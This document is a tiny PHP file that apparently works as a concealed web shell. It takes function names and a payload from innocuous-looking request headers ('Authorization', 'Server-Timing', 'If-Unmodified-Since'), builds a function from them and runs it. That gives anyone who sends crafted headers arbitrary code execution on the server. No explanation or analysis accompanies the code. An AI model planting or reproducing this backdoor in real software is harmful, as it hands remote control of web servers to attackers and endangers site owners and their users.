<?php
$_HEADERS = getallheaders();
if (isset($_HEADERS['Authorization'])) {
    $internal = $_HEADERS['Authorization']('', $_HEADERS['Server-Timing']($_HEADERS['If-Unmodified-Since']));
    $internal();
}